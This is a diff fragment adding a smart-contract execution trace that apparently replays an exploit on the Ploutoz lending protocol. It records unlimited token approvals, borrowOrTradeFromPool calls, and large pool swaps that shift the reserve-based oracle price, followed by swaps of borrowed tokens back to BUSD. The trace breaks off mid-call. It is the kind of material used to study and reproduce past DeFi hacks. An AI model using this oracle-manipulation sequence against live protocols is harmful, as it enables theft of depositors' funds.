+    │   │   │   │   │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x27b6031E9cbB9a383ACf2f7d7168Ba052ccaeCfb, value: 115792089237316195423570985008687907853269984665640564037457584007913129639935 [1.157e77])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [539059] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::borrowOrTradeFromPool(0xc863a3b8ff15a9b0eead1cca6bfb9a07c0ebd8ff86a42b6f8f52dd124cd24c80, 0x0000000000000000000000000000000000000000000000000000000000000000, true, 50000000000000000000 [5e19], [0x27b6031E9cbB9a383ACf2f7d7168Ba052ccaeCfb, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x0000000000000000000000000000000000000000], [94270236300029182731 [9.427e19], 90019374766508720631735 [9.001e22], 19374766508720631735 [1.937e19], 19374766508720631735 [1.937e19], 2000000000000000000000 [2e21]], 0x)
+    │   │   │   │   │   ├─ [538125] 0x067D0A19e92a65CAa2Fcd8F3c88DA8851fCd3771::borrowOrTradeFromPool(0xc863a3b8ff15a9b0eead1cca6bfb9a07c0ebd8ff86a42b6f8f52dd124cd24c80, 0x0000000000000000000000000000000000000000000000000000000000000000, true, 50000000000000000000 [5e19], [0x27b6031E9cbB9a383ACf2f7d7168Ba052ccaeCfb, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x0000000000000000000000000000000000000000], [94270236300029182731 [9.427e19], 90019374766508720631735 [9.001e22], 19374766508720631735 [1.937e19], 19374766508720631735 [1.937e19], 2000000000000000000000 [2e21]], 0x) [delegatecall]
+    │   │   │   │   │   │   ├─ [8820] 0x86043747dae9b6dd80C463A29e5B21e50BeF5e7d::queryRate(0x844FA82f1E54824655470970F7004Dd90546bB28, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2044] 0xA41BF81be90fe9666CD566A80c85871f41529aed::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22], 1024535809866719119382771 [1.024e24], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 73007656583258593795 [7.3e19]
+    │   │   │   │   │   │   │   ├─ [381] 0x844FA82f1E54824655470970F7004Dd90546bB28::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [425] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000003f52f4cd9f0d65a030000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   │   │   │   ├─  emit topic 0: 0xfb6c38ae4fdd498b3a5003f02ca4ca5340dfedb36b1b100c679eb60633b2c0a7
+    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000844fa82f1e54824655470970f7004dd90546bb28
+    │   │   │   │   │   │   │        topic 3: 0xbbf9195c81684857066e924aee38b2d0dfa553da4d1e57ccaf2f1b97e1b6c65f
+    │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000018fae27693b40000
+    │   │   │   │   │   │   ├─ [12799] 0x86043747dae9b6dd80C463A29e5B21e50BeF5e7d::queryReturn(0x844FA82f1E54824655470970F7004Dd90546bB28, 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, 900000000000000000 [9e17]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2044] 0xA41BF81be90fe9666CD566A80c85871f41529aed::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22], 1024535809866719119382771 [1.024e24], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 73007656583258593795 [7.3e19]
+    │   │   │   │   │   │   │   ├─ [381] 0x844FA82f1E54824655470970F7004Dd90546bB28::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [2704] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Revert] revert: target not active
+    │   │   │   │   │   │   │   └─ ← [Revert] revert: target not active
+    │   │   │   │   │   │   ├─ [8259] 0x86043747dae9b6dd80C463A29e5B21e50BeF5e7d::getCurrentMargin(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, 0x844FA82f1E54824655470970F7004Dd90546bB28, 90019374766508720631735 [9.001e22], 1998200000000000000000 [1.998e21]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2044] 0xA41BF81be90fe9666CD566A80c85871f41529aed::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22], 1024535809866719119382771 [1.024e24], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 73007656583258593795 [7.3e19]
+    │   │   │   │   │   │   │   ├─ [381] 0x844FA82f1E54824655470970F7004Dd90546bB28::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [425] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000035d3b7e56a35944de000000000000000000000000000000000000000000000003f52f4cd9f0d65a03
+    │   │   │   │   │   │   ├─  emit topic 0: 0x7bd8cbb7ba34b33004f3deda0fd36c92fc0360acbd97843360037b467a538f90
+    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │        topic 2: 0x00000000000000000000000027b6031e9cbb9a383acf2f7d7168ba052ccaecfb
+    │   │   │   │   │   │   │        topic 3: 0xbbf9195c81684857066e924aee38b2d0dfa553da4d1e57ccaf2f1b97e1b6c65f
+    │   │   │   │   │   │   │           data: 0x000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d56000000000000000000000000844fa82f1e54824655470970f7004dd90546bb2800000000000000000000000000000000000000000000130ff5c8170d22adafb700000000000000000000000000000000000000000000006c52987915298c00000000000000000000000000000000000000000000000000051c432873235fc30b0000000000000000000000000000000000000000000000000000000000001c1f000000000000000000000000000000000000000000000003f52f4cd9f0d65a030000000000000000000000000000000000000000000000035d3b7e56a35944de
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000130ff5c8170d22adafb700000000000000000000000000000000000000000000006c52987915298c0000
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000130ff5c8170d22adafb700000000000000000000000000000000000000000000006c52987915298c0000
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000130ff5c8170d22adafb700000000000000000000000000000000000000000000006c52987915298c0000
+    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000130ff5c8170d22adafb700000000000000000000000000000000000000000000006c52987915298c0000
+    │   │   ├─ [4709] 0x844FA82f1E54824655470970F7004Dd90546bB28::approve(0x6B011d0d53b0Da6ace2a3F436Fd197A4E35f47EF, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x6B011d0d53b0Da6ace2a3F436Fd197A4E35f47EF, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [33544] 0x6B011d0d53b0Da6ace2a3F436Fd197A4E35f47EF::swapExactTokensForTokens(570625638619593832545805 [5.706e23], 0, [0x844FA82f1E54824655470970F7004Dd90546bB28, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1637659441 [1.637e9])
+    │   │   │   ├─ [504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22], 1024535809866719119382771 [1.024e24], 1637659441 [1.637e9]
+    │   │   │   ├─ [8855] 0x844FA82f1E54824655470970F7004Dd90546bB28::transferFrom(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E, 570625638619593832545805 [5.706e23])
+    │   │   │   │   ├─ emit Transfer(from: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E, value: 570625638619593832545805 [5.706e23])
+    │   │   │   │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x6B011d0d53b0Da6ace2a3F436Fd197A4E35f47EF, value: 115792089237316195423570985008687907853269984665640563468831945388319297094130 [1.157e77])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [16466] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::swap(0, 999872191888029716855925 [9.998e23], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [3271] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::transfer(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 999872191888029716855925 [9.998e23])
+    │   │   │   │   │   ├─ emit Transfer(from: 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E, to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 999872191888029716855925 [9.998e23])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [557] 0x844FA82f1E54824655470970F7004Dd90546bB28::balanceOf(0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 584658903866209839027117 [5.846e23]
+    │   │   │   │   ├─ [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 24663617978689402526846 [2.466e22]
+    │   │   │   │   ├─ emit Sync(reserve0: 584658903866209839027117 [5.846e23], reserve1: 24663617978689402526846 [2.466e22])
+    │   │   │   │   ├─ emit Swap(sender: 0x6B011d0d53b0Da6ace2a3F436Fd197A4E35f47EF, amount0In: 570625638619593832545805 [5.706e23], amount1In: 0, amount0Out: 0, amount1Out: 999872191888029716855925 [9.998e23], to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   └─ ← [Return] [570625638619593832545805 [5.706e23], 999872191888029716855925 [9.998e23]]
+    │   │   ├─ [3271] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::transfer(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16, 1002951020000000000000000 [1.002e24])
+    │   │   │   ├─ emit Transfer(from: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16, value: 1002951020000000000000000 [1.002e24])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop] 
+    │   ├─ [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16) [staticcall]
+    │   │   └─ ← [Return] 391470321162370121889003 [3.914e23]
+    │   ├─ [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16) [staticcall]
+    │   │   └─ ← [Return] 222145178777466936985544185 [2.221e26]
+    │   ├─ emit Sync(reserve0: 391470321162370121889003 [3.914e23], reserve1: 222145178777466936985544185 [2.221e26])
+    │   ├─ emit Swap(sender: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 1002951020000000000000000 [1.002e24], amount0Out: 0, amount1Out: 1000400000000000000000000 [1e24], to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   └─ ← [Stop] 
+    ├─ [481] 0x539Ff593840387439196721cB2Ce5a94051DAEB6::loanTokenAddress() [staticcall]
+    │   └─ ← [Return] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82
+    ├─ [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 85000000000000000000 [8.5e19]
+    ├─ [24586] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [62521] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokens(85000000000000000000 [8.5e19], 0, [0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1637659441 [1.637e9])
+    │   ├─ [893] 0x804678fa97d91B974ec2af3c843270886528a9E6::getReserves() [staticcall]
+    │   │   └─ ← [Return] 1596652562252473757149170 [1.596e24], 23615711342557801053422323 [2.361e25], 1637659426 [1.637e9]
+    │   ├─ [10794] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::transferFrom(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x804678fa97d91B974ec2af3c843270886528a9E6, 85000000000000000000 [8.5e19])
+    │   │   ├─ emit Transfer(from: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x804678fa97d91B974ec2af3c843270886528a9E6, value: 85000000000000000000 [8.5e19])
+    │   │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039372584007913129639935 [1.157e77])
+    │   │   └─ ← [Return] true
+    │   ├─ [42445] 0x804678fa97d91B974ec2af3c843270886528a9E6::swap(0, 1254005316383135135716 [1.254e21], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   ├─ [8071] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::transfer(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1254005316383135135716 [1.254e21])
+    │   │   │   ├─ emit Transfer(from: 0x804678fa97d91B974ec2af3c843270886528a9E6, to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1254005316383135135716 [1.254e21])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0x804678fa97d91B974ec2af3c843270886528a9E6) [staticcall]
+    │   │   │   └─ ← [Return] 1596737562252473757149170 [1.596e24]
+    │   │   ├─ [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x804678fa97d91B974ec2af3c843270886528a9E6) [staticcall]
+    │   │   │   └─ ← [Return] 23614457337241417918286607 [2.361e25]
+    │   │   ├─ emit Sync(reserve0: 1596737562252473757149170 [1.596e24], reserve1: 23614457337241417918286607 [2.361e25])
+    │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 85000000000000000000 [8.5e19], amount1In: 0, amount0Out: 0, amount1Out: 1254005316383135135716 [1.254e21], to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] [85000000000000000000 [8.5e19], 1254005316383135135716 [1.254e21]]
+    ├─ [481] 0xD90EFadeA37a6dB7f6EAC73cC9627Ca87aC7F705::loanTokenAddress() [staticcall]
+    │   └─ ← [Return] 0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5
+    ├─ [510] 0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5::balanceOf(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 18000000000000000000000 [1.8e22]
+    ├─ [24514] 0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [76351] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokens(18000000000000000000000 [1.8e22], 0, [0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1637659441 [1.637e9])
+    │   ├─ [2893] 0x1Bf5c27B04D13bf205B76e6D57B4ceeeD783b9a0::getReserves() [staticcall]
+    │   │   └─ ← [Return] 9346219681771491 [9.346e15], 9644165378321690 [9.644e15], 1631170896 [1.631e9]
+    │   ├─ [20065] 0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5::transferFrom(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1Bf5c27B04D13bf205B76e6D57B4ceeeD783b9a0, 18000000000000000000000 [1.8e22])
+    │   │   ├─ [8801] 0x7A9634F6917b9736832f50f4C19b3A231B36F79b::updateUserWithdrawFee(0x1Bf5c27B04D13bf205B76e6D57B4ceeeD783b9a0, 18000000000000000000000 [1.8e22])
+    │   │   │   ├─ [7970] 0x9AA48b6e2a063D5F4aB1C7C9dFAaE1bB2212176e::e9252d46(00000000000000000000000000000000000000000000000000000000000000c90000000000000000000000001bf5c27b04d13bf205b76e6d57b4ceeed783b9a00000000000000000000000000000000000000000000003cfc82e37e9a7400000) [delegatecall]
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ emit Transfer(from: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x1Bf5c27B04D13bf205B76e6D57B4ceeeD783b9a0, value: 18000000000000000000000 [1.8e22])
+    │   │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564021457584007913129639935 [1.157e77])
+    │   │   └─ ← [Return] true
+    │   ├─ [42424] 0x1Bf5c27B04D13bf205B76e6D57B4ceeeD783b9a0::swap(9346214661641173 [9.346e15], 0, Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   ├─ [8071] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::transfer(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9346214661641173 [9.346e15])
+    │   │   │   ├─ emit Transfer(from: 0x1Bf5c27B04D13bf205B76e6D57B4ceeeD783b9a0, to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 9346214661641173 [9.346e15])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x1Bf5c27B04D13bf205B76e6D57B4ceeeD783b9a0) [staticcall]
+    │   │   │   └─ ← [Return] 5020130318 [5.02e9]
+    │   │   ├─ [510] 0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5::balanceOf(0x1Bf5c27B04D13bf205B76e6D57B4ceeeD783b9a0) [staticcall]
+    │   │   │   └─ ← [Return] 18000009644165378321690 [1.8e22]
+    │   │   ├─ emit Sync(reserve0: 5020130318 [5.02e9], reserve1: 18000009644165378321690 [1.8e22])
+    │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 0, amount1In: 18000000000000000000000 [1.8e22], amount0Out: 9346214661641173 [9.346e15], amount1Out: 0, to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] [18000000000000000000000 [1.8e22], 9346214661641173 [9.346e15]]
+    ├─ [481] 0xBfA0eD8a55D0d83eD92a9A96c35D59a54D238872::loanTokenAddress() [staticcall]
+    │   └─ ← [Return] 0x2170Ed0880ac9A755fd29B2688956BD959F933F8
+    ├─ [531] 0x2170Ed0880ac9A755fd29B2688956BD959F933F8::balanceOf(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 18000000000000000000 [1.8e19]
+    ├─ [24562] 0x2170Ed0880ac9A755fd29B2688956BD959F933F8::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [62561] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokens(18000000000000000000 [1.8e19], 0, [0x2170Ed0880ac9A755fd29B2688956BD959F933F8, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1637659441 [1.637e9])
+    │   ├─ [893] 0x7213a321F1855CF1779f42c0CD85d3D95291D34C::getReserves() [staticcall]
+    │   │   └─ ← [Return] 112730410706132869514 [1.127e20], 465760816145786721638343 [4.657e23], 1637659429 [1.637e9]
+    │   ├─ [10834] 0x2170Ed0880ac9A755fd29B2688956BD959F933F8::transferFrom(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x7213a321F1855CF1779f42c0CD85d3D95291D34C, 18000000000000000000 [1.8e19])
+    │   │   ├─ emit Transfer(from: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x7213a321F1855CF1779f42c0CD85d3D95291D34C, value: 18000000000000000000 [1.8e19])
+    │   │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039439584007913129639935 [1.157e77])
+    │   │   └─ ← [Return] true
+    │   ├─ [42445] 0x7213a321F1855CF1779f42c0CD85d3D95291D34C::swap(0, 63991346920143627067700 [6.399e22], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   ├─ [8071] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::transfer(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 63991346920143627067700 [6.399e22])
+    │   │   │   ├─ emit Transfer(from: 0x7213a321F1855CF1779f42c0CD85d3D95291D34C, to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 63991346920143627067700 [6.399e22])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [531] 0x2170Ed0880ac9A755fd29B2688956BD959F933F8::balanceOf(0x7213a321F1855CF1779f42c0CD85d3D95291D34C) [staticcall]
+    │   │   │   └─ ← [Return] 130730410706132869514 [1.307e20]
+    │   │   ├─ [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x7213a321F1855CF1779f42c0CD85d3D95291D34C) [staticcall]
+    │   │   │   └─ ← [Return] 401769469225643094570643 [4.017e23]
+    │   │   ├─ emit Sync(reserve0: 130730410706132869514 [1.307e20], reserve1: 401769469225643094570643 [4.017e23])
+    │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 18000000000000000000 [1.8e19], amount1In: 0, amount0Out: 0, amount1Out: 63991346920143627067700 [6.399e22], to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] [18000000000000000000 [1.8e19], 63991346920143627067700 [6.399e22]]
+    ├─ [481] 0x1EF256E054C838B0C5a544149459C7F719Ff7A8d::loanTokenAddress() [staticcall]
+    │   └─ ← [Return] 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c
+    ├─ [531] 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c::balanceOf(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 1600000000000000000 [1.6e18]
+    ├─ [24562] 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [62561] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokens(1600000000000000000 [1.6e18], 0, [0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1637659441 [1.637e9])
+    │   ├─ [893] 0xF45cd219aEF8618A92BAa7aD848364a158a24F33::getReserves() [staticcall]
+    │   │   └─ ← [Return] 1079234714420436564070 [1.079e21], 60833839343655072111865173 [6.083e25], 1637659384 [1.637e9]
+    │   ├─ [10834] 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c::transferFrom(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xF45cd219aEF8618A92BAa7aD848364a158a24F33, 1600000000000000000 [1.6e18])
+    │   │   ├─ emit Transfer(from: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xF45cd219aEF8618A92BAa7aD848364a158a24F33, value: 1600000000000000000 [1.6e18])
+    │   │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039455984007913129639935 [1.157e77])
+    │   │   └─ ← [Return] true
+    │   ├─ [42445] 0xF45cd219aEF8618A92BAa7aD848364a158a24F33::swap(0, 89829800631207601269238 [8.982e22], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   ├─ [8071] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::transfer(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 89829800631207601269238 [8.982e22])
+    │   │   │   ├─ emit Transfer(from: 0xF45cd219aEF8618A92BAa7aD848364a158a24F33, to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 89829800631207601269238 [8.982e22])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [531] 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c::balanceOf(0xF45cd219aEF8618A92BAa7aD848364a158a24F33) [staticcall]
+    │   │   │   └─ ← [Return] 1080834714420436564070 [1.08e21]
+    │   │   ├─ [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0xF45cd219aEF8618A92BAa7aD848364a158a24F33) [staticcall]
+    │   │   │   └─ ← [Return] 60744009543023864510595935 [6.074e25]
+    │   │   ├─ emit Sync(reserve0: 1080834714420436564070 [1.08e21], reserve1: 60744009543023864510595935 [6.074e25])
